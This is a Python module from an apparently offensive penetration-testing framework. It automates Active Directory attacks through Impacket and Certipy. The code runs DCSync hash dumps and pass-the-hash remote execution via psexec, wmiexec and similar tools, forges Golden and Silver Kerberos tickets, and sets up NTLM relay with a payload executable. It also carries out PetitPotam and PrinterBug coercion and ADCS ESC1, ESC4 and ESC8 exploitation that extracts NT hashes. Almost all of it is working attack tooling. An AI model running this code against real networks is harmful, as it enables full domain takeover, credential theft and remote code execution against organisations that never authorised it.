#!/usr/bin/env python3
"""
NexusPen - Active Directory Attacks Module
==========================================
Comprehensive AD attack techniques using Impacket.

Includes:
- DCSync attack
- Pass-the-Hash (PtH)
- Pass-the-Ticket (PtT)
- Overpass-the-Hash (Pass-the-Key)
- Golden Ticket
- Silver Ticket
- Skeleton Key
- DCShadow
"""

import subprocess
import os
import re
from typing import Dict, List, Optional
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()


@dataclass
class ADAttackResult:
    """Result of an AD attack."""
    attack_type: str
    success: bool
    target: str
    data: Optional[Dict] = None
    error: Optional[str] = None


class ImpacketAttacks:
    """
    Impacket-based AD attacks.
    All attack tools from Impacket suite.
    """
    
    def __init__(self, target: str, domain: str, config: Dict = None):
        self.target = target  # DC IP
        self.domain = domain
        self.config = config or {}
    
    def secretsdump(self, username: str, password: str = None, 
                   ntlm_hash: str = None, output_file: str = None) -> ADAttackResult:
        """
        DCSync attack using secretsdump.py
        Dumps NTDS.dit hashes remotely.
        
        Args:
            username: Domain admin username
            password: Password (or use ntlm_hash)
            ntlm_hash: NTLM hash for PtH
            output_file: Output file for hashes
        """
        console.print(f"\n[cyan]🔐 Running DCSync attack (secretsdump)...[/cyan]")
        
        result = ADAttackResult(
            attack_type='dcsync',
            success=False,
            target=self.target
        )
        
        cmd = ['secretsdump.py']
        
        if ntlm_hash:
            cmd.append(f'{self.domain}/{username}@{self.target}')
            cmd.extend(['-hashes', f':{ntlm_hash}'])
        else:
            cmd.append(f'{self.domain}/{username}:{password}@{self.target}')
        
        if output_file:
            cmd.extend(['-outputfile', output_file])
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if 'Administrator:' in proc.stdout or 'krbtgt:' in proc.stdout:
                result.success = True
                
                # Parse hashes
                hashes = {}
                for line in proc.stdout.split('\n'):
                    if ':::' in line:
                        parts = line.split(':')
                        if len(parts) >= 4:
                            hashes[parts[0]] = parts[3]  # username: NTLM hash
                
                result.data = {
                    'hashes_count': len(hashes),
                    'sample_users': list(hashes.keys())[:10],
                    'output_file': output_file
                }
                
                console.print(f"[green]✓ DCSync successful! Got {len(hashes)} hashes[/green]")
            else:
                result.error = proc.stderr
                console.print("[red]✗ DCSync failed[/red]")
                
        except subprocess.TimeoutExpired:
            result.error = "Timeout"
        except FileNotFoundError:
            result.error = "secretsdump.py not found"
        
        return result
    
    def psexec(self, username: str, password: str = None,
              ntlm_hash: str = None, command: str = None) -> ADAttackResult:
        """
        PsExec remote execution.
        
        Args:
            username: Username for auth
            password: Password
            ntlm_hash: NTLM hash for PtH
            command: Command to execute
        """
        console.print(f"\n[cyan]🎯 Running PsExec against {self.target}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='psexec',
            success=False,
            target=self.target
        )
        
        cmd = ['psexec.py']
        
        if ntlm_hash:
            cmd.append(f'{self.domain}/{username}@{self.target}')
            cmd.extend(['-hashes', f':{ntlm_hash}'])
        else:
            cmd.append(f'{self.domain}/{username}:{password}@{self.target}')
        
        if command:
            cmd.extend(['-c', command])
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if 'Microsoft Windows' in proc.stdout or 'C:\\' in proc.stdout:
                result.success = True
                result.data = {'output': proc.stdout[:500]}
                console.print("[green]✓ PsExec successful![/green]")
            else:
                result.error = proc.stderr
                
        except subprocess.TimeoutExpired:
            result.error = "Timeout"
        except FileNotFoundError:
            result.error = "psexec.py not found"
        
        return result
    
    def wmiexec(self, username: str, password: str = None,
               ntlm_hash: str = None, command: str = None) -> ADAttackResult:
        """WMI execution for stealthier access."""
        console.print(f"\n[cyan]🎯 Running WMIExec against {self.target}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='wmiexec',
            success=False,
            target=self.target
        )
        
        cmd = ['wmiexec.py']
        
        if ntlm_hash:
            cmd.append(f'{self.domain}/{username}@{self.target}')
            cmd.extend(['-hashes', f':{ntlm_hash}'])
        else:
            cmd.append(f'{self.domain}/{username}:{password}@{self.target}')
        
        if command:
            cmd.append(command)
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if proc.returncode == 0:
                result.success = True
                result.data = {'output': proc.stdout[:500]}
                console.print("[green]✓ WMIExec successful![/green]")
                
        except subprocess.TimeoutExpired:
            result.error = "Timeout"
        except FileNotFoundError:
            result.error = "wmiexec.py not found"
        
        return result
    
    def smbexec(self, username: str, password: str = None,
               ntlm_hash: str = None) -> ADAttackResult:
        """SMB execution."""
        console.print(f"\n[cyan]🎯 Running SMBExec against {self.target}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='smbexec',
            success=False,
            target=self.target
        )
        
        cmd = ['smbexec.py']
        
        if ntlm_hash:
            cmd.append(f'{self.domain}/{username}@{self.target}')
            cmd.extend(['-hashes', f':{ntlm_hash}'])
        else:
            cmd.append(f'{self.domain}/{username}:{password}@{self.target}')
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if proc.returncode == 0:
                result.success = True
                console.print("[green]✓ SMBExec successful![/green]")
                
        except subprocess.TimeoutExpired:
            result.error = "Timeout"
        except FileNotFoundError:
            result.error = "smbexec.py not found"
        
        return result
    
    def atexec(self, username: str, password: str, command: str) -> ADAttackResult:
        """Execute command via Task Scheduler."""
        console.print(f"\n[cyan]🎯 Running ATExec against {self.target}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='atexec',
            success=False,
            target=self.target
        )
        
        cmd = [
            'atexec.py',
            f'{self.domain}/{username}:{password}@{self.target}',
            command
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if proc.returncode == 0:
                result.success = True
                result.data = {'output': proc.stdout}
                console.print("[green]✓ ATExec successful![/green]")
                
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def dcomexec(self, username: str, password: str = None,
                ntlm_hash: str = None, command: str = None) -> ADAttackResult:
        """DCOM execution."""
        console.print(f"\n[cyan]🎯 Running DCOMExec against {self.target}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='dcomexec',
            success=False,
            target=self.target
        )
        
        cmd = ['dcomexec.py']
        
        if ntlm_hash:
            cmd.append(f'{self.domain}/{username}@{self.target}')
            cmd.extend(['-hashes', f':{ntlm_hash}'])
        else:
            cmd.append(f'{self.domain}/{username}:{password}@{self.target}')
        
        if command:
            cmd.append(command)
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if proc.returncode == 0:
                result.success = True
                result.data = {'output': proc.stdout}
                console.print("[green]✓ DCOMExec successful![/green]")
                
        except Exception as e:
            result.error = str(e)
        
        return result


class TicketAttacks:
    """
    Kerberos ticket-based attacks.
    Golden Ticket, Silver Ticket, Pass-the-Ticket.
    """
    
    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip
    
    def create_golden_ticket(self, username: str, domain_sid: str,
                            krbtgt_hash: str, output_file: str = None) -> ADAttackResult:
        """
        Create a Golden Ticket.
        
        Args:
            username: User to impersonate
            domain_sid: Domain SID
            krbtgt_hash: krbtgt NTLM hash
            output_file: Output .ccache file
        """
        console.print(f"\n[cyan]🎫 Creating Golden Ticket for {username}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='golden_ticket',
            success=False,
            target=self.domain
        )
        
        output_file = output_file or '/tmp/golden.ccache'
        
        cmd = [
            'ticketer.py',
            '-nthash', krbtgt_hash,
            '-domain-sid', domain_sid,
            '-domain', self.domain,
            '-user-id', '500',  # Administrator RID
            '-groups', '512,513,518,519,520',  # Domain Admins groups
            username,
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'Saving ticket' in proc.stdout or os.path.exists(f'{username}.ccache'):
                result.success = True
                result.data = {
                    'ticket_file': f'{username}.ccache',
                    'username': username
                }
                console.print(f"[green]✓ Golden Ticket created: {username}.ccache[/green]")
            else:
                result.error = proc.stderr
                
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def create_silver_ticket(self, username: str, domain_sid: str,
                            service_hash: str, spn: str,
                            output_file: str = None) -> ADAttackResult:
        """
        Create a Silver Ticket for a specific service.
        
        Args:
            username: User to impersonate
            domain_sid: Domain SID
            service_hash: Service account NTLM hash
            spn: Service Principal Name
            output_file: Output .ccache file
        """
        console.print(f"\n[cyan]🎫 Creating Silver Ticket for {spn}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='silver_ticket',
            success=False,
            target=spn
        )
        
        cmd = [
            'ticketer.py',
            '-nthash', service_hash,
            '-domain-sid', domain_sid,
            '-domain', self.domain,
            '-spn', spn,
            username,
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'Saving ticket' in proc.stdout:
                result.success = True
                result.data = {
                    'ticket_file': f'{username}.ccache',
                    'spn': spn
                }
                console.print(f"[green]✓ Silver Ticket created for {spn}[/green]")
            else:
                result.error = proc.stderr
                
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def pass_the_ticket(self, ticket_file: str) -> bool:
        """
        Load a ticket for use with other tools.
        
        Args:
            ticket_file: Path to .ccache ticket file
        """
        console.print(f"\n[cyan]🎫 Loading ticket: {ticket_file}[/cyan]")
        
        if not os.path.exists(ticket_file):
            console.print("[red]Ticket file not found[/red]")
            return False
        
        # Set environment variable
        os.environ['KRB5CCNAME'] = ticket_file
        console.print(f"[green]✓ Ticket loaded. KRB5CCNAME={ticket_file}[/green]")
        
        return True
    
    def request_tgt(self, username: str, password: str = None,
                   ntlm_hash: str = None) -> ADAttackResult:
        """
        Request a TGT (Ticket Granting Ticket).
        Overpass-the-Hash / Pass-the-Key attack.
        """
        console.print(f"\n[cyan]🎫 Requesting TGT for {username}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='overpass_the_hash',
            success=False,
            target=self.domain
        )
        
        cmd = ['getTGT.py', f'{self.domain}/{username}']
        
        if ntlm_hash:
            cmd.extend(['-hashes', f':{ntlm_hash}'])
        elif password:
            cmd.extend(['-password', password])
        
        cmd.extend(['-dc-ip', self.dc_ip])
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'Saving ticket' in proc.stdout:
                result.success = True
                result.data = {'ticket_file': f'{username}.ccache'}
                console.print(f"[green]✓ TGT obtained: {username}.ccache[/green]")
            else:
                result.error = proc.stderr
                
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def request_st(self, spn: str, ticket_file: str = None) -> ADAttackResult:
        """
        Request a Service Ticket using existing TGT.
        """
        console.print(f"\n[cyan]🎫 Requesting ST for {spn}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='request_st',
            success=False,
            target=spn
        )
        
        if ticket_file:
            os.environ['KRB5CCNAME'] = ticket_file
        
        cmd = [
            'getST.py',
            '-spn', spn,
            '-dc-ip', self.dc_ip,
            '-k', '-no-pass',
            self.domain
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'Saving ticket' in proc.stdout:
                result.success = True
                console.print(f"[green]✓ Service Ticket obtained for {spn}[/green]")
                
        except Exception as e:
            result.error = str(e)
        
        return result


class NTLMRelayAttacks:
    """NTLM Relay attacks."""
    
    def __init__(self, target: str, config: Dict = None):
        self.target = target
        self.config = config or {}
    
    def relay_to_ldap(self, target_dc: str, escalate_user: str = None) -> ADAttackResult:
        """
        Relay NTLM auth to LDAP for privilege escalation.
        """
        console.print(f"\n[cyan]🔄 Setting up NTLM Relay to LDAP...[/cyan]")
        
        result = ADAttackResult(
            attack_type='ntlm_relay_ldap',
            success=False,
            target=target_dc
        )
        
        cmd = [
            'ntlmrelayx.py',
            '-t', f'ldaps://{target_dc}',
            '--escalate-user', escalate_user or 'Administrator',
        ]
        
        console.print(f"[yellow]Run: {' '.join(cmd)}[/yellow]")
        console.print("[yellow]Then trigger NTLM authentication (e.g., PetitPotam)[/yellow]")
        
        result.data = {'command': ' '.join(cmd)}
        return result
    
    def relay_to_smb(self, targets_file: str) -> ADAttackResult:
        """
        Relay NTLM auth to SMB for code execution.
        """
        console.print(f"\n[cyan]🔄 Setting up NTLM Relay to SMB...[/cyan]")
        
        result = ADAttackResult(
            attack_type='ntlm_relay_smb',
            success=False,
            target='multiple'
        )
        
        cmd = [
            'ntlmrelayx.py',
            '-tf', targets_file,
            '-smb2support',
            '-e', '/tmp/payload.exe',  # Execute payload
        ]
        
        console.print(f"[yellow]Run: {' '.join(cmd)}[/yellow]")
        result.data = {'command': ' '.join(cmd)}
        return result
    
    def coerce_with_petitpotam(self, listener_ip: str, target_dc: str) -> ADAttackResult:
        """
        Use PetitPotam to coerce DC authentication.
        """
        console.print(f"\n[cyan]🎯 Running PetitPotam against {target_dc}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='petitpotam',
            success=False,
            target=target_dc
        )
        
        cmd = [
            'petitpotam.py',
            listener_ip,
            target_dc,
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if 'Attack completed' in proc.stdout or proc.returncode == 0:
                result.success = True
                console.print("[green]✓ PetitPotam coercion sent[/green]")
                
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def coerce_with_printerbug(self, listener_ip: str, target: str,
                              username: str, password: str) -> ADAttackResult:
        """
        Use PrinterBug (SpoolSample) to coerce authentication.
        """
        console.print(f"\n[cyan]🖨️ Running PrinterBug against {target}...[/cyan]")
        
        result = ADAttackResult(
            attack_type='printerbug',
            success=False,
            target=target
        )
        
        cmd = [
            'printerbug.py',
            f'{username}:{password}@{target}',
            listener_ip,
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if proc.returncode == 0:
                result.success = True
                console.print("[green]✓ PrinterBug triggered[/green]")
                
        except Exception as e:
            result.error = str(e)
        
        return result


class ADCSAttacks:
    """
    Active Directory Certificate Services attacks.
    ESC1-ESC8 exploitation.
    """
    
    def __init__(self, domain: str, dc_ip: str):
        self.domain = domain
        self.dc_ip = dc_ip
    
    def find_vulnerable_templates(self, username: str, password: str) -> Dict:
        """
        Find vulnerable certificate templates (ESC1-ESC8).
        """
        console.print(f"\n[cyan]🔍 Scanning for ADCS vulnerabilities...[/cyan]")
        
        results = {
            'esc1': [],
            'esc2': [],
            'esc3': [],
            'esc4': [],
            'esc6': [],
            'esc7': [],
            'esc8': [],
        }
        
        cmd = [
            'certipy', 'find',
            '-u', f'{username}@{self.domain}',
            '-p', password,
            '-dc-ip', self.dc_ip,
            '-vulnerable',
            '-stdout'
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            output = proc.stdout
            
            # Parse ESC vulnerabilities
            for esc_num in range(1, 9):
                if f'ESC{esc_num}' in output:
                    # Extract template name
                    pattern = rf'Template Name\s*:\s*(.+?)(?:\n|ESC{esc_num})'
                    templates = re.findall(pattern, output)
                    results[f'esc{esc_num}'] = templates
            
            console.print("[green]✓ ADCS scan completed[/green]")
            
            # Display findings
            for esc, templates in results.items():
                if templates:
                    console.print(f"[red]⚠️ {esc.upper()}: {', '.join(templates)}[/red]")
                    
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        
        return results
    
    def exploit_esc1(self, username: str, password: str,
                    template: str, upn: str) -> ADAttackResult:
        """
        Exploit ESC1: Misconfigured Certificate Templates.
        Request certificate as another user.
        """
        console.print(f"\n[cyan]🎫 Exploiting ESC1 with template: {template}[/cyan]")
        
        result = ADAttackResult(
            attack_type='esc1',
            success=False,
            target=template
        )
        
        cmd = [
            'certipy', 'req',
            '-u', f'{username}@{self.domain}',
            '-p', password,
            '-dc-ip', self.dc_ip,
            '-ca', f'{self.domain}-CA',
            '-template', template,
            '-upn', upn,
        ]
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if 'Certificate' in proc.stdout and '.pfx' in proc.stdout:
                result.success = True
                result.data = {'output': proc.stdout}
                console.print(f"[green]✓ Got certificate as {upn}![/green]")
                
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def exploit_esc4(self, username: str, password: str,
                    template: str) -> ADAttackResult:
        """
        Exploit ESC4: Vulnerable Certificate Template ACL.
        Modify template to enable ESC1 exploitation.
        """
        console.print(f"\n[cyan]🎫 Exploiting ESC4: Modifying template {template}[/cyan]")
        
        result = ADAttackResult(
            attack_type='esc4',
            success=False,
            target=template
        )
        
        # Step 1: Save original template
        cmd_save = [
            'certipy', 'template',
            '-u', f'{username}@{self.domain}',
            '-p', password,
            '-dc-ip', self.dc_ip,
            '-template', template,
            '-save-old',
        ]
        
        # Step 2: Modify template for ESC1
        cmd_modify = [
            'certipy', 'template',
            '-u', f'{username}@{self.domain}',
            '-p', password,
            '-dc-ip', self.dc_ip,
            '-template', template,
            '-configuration', 'ESC1',
        ]
        
        try:
            subprocess.run(cmd_save, capture_output=True, timeout=60)
            proc = subprocess.run(cmd_modify, capture_output=True, text=True, timeout=60)
            
            if 'Successfully' in proc.stdout:
                result.success = True
                console.print("[green]✓ Template modified! Now exploit as ESC1[/green]")
                
        except Exception as e:
            result.error = str(e)
        
        return result
    
    def exploit_esc8(self, listener_ip: str, ca_host: str) -> ADAttackResult:
        """
        Exploit ESC8: NTLM Relay to AD CS HTTP Endpoints.
        """
        console.print(f"\n[cyan]🔄 Setting up ESC8 relay attack...[/cyan]")
        
        result = ADAttackResult(
            attack_type='esc8',
            success=False,
            target=ca_host
        )
        
        cmd = [
            'certipy', 'relay',
            '-ca', ca_host,
            '-template', 'DomainController',
        ]
        
        console.print(f"[yellow]Run: {' '.join(cmd)}[/yellow]")
        console.print("[yellow]Then coerce authentication with PetitPotam[/yellow]")
        
        result.data = {'command': ' '.join(cmd)}
        return result
    
    def authenticate_with_cert(self, pfx_file: str, 
                              pfx_password: str = None) -> ADAttackResult:
        """
        Authenticate using a certificate to get TGT/NT hash.
        """
        console.print(f"\n[cyan]🔐 Authenticating with certificate...[/cyan]")
        
        result = ADAttackResult(
            attack_type='cert_auth',
            success=False,
            target=pfx_file
        )
        
        cmd = [
            'certipy', 'auth',
            '-pfx', pfx_file,
            '-dc-ip', self.dc_ip,
        ]
        
        if pfx_password:
            cmd.extend(['-password', pfx_password])
        
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'NT hash' in proc.stdout or 'Got hash' in proc.stdout:
                result.success = True
                
                # Extract hash
                hash_match = re.search(r'NT hash:\s*([a-f0-9]{32})', proc.stdout)
                if hash_match:
                    result.data = {'nt_hash': hash_match.group(1)}
                    console.print(f"[green]✓ Got NT hash: {hash_match.group(1)}[/green]")
                    
        except Exception as e:
            result.error = str(e)
        
        return result
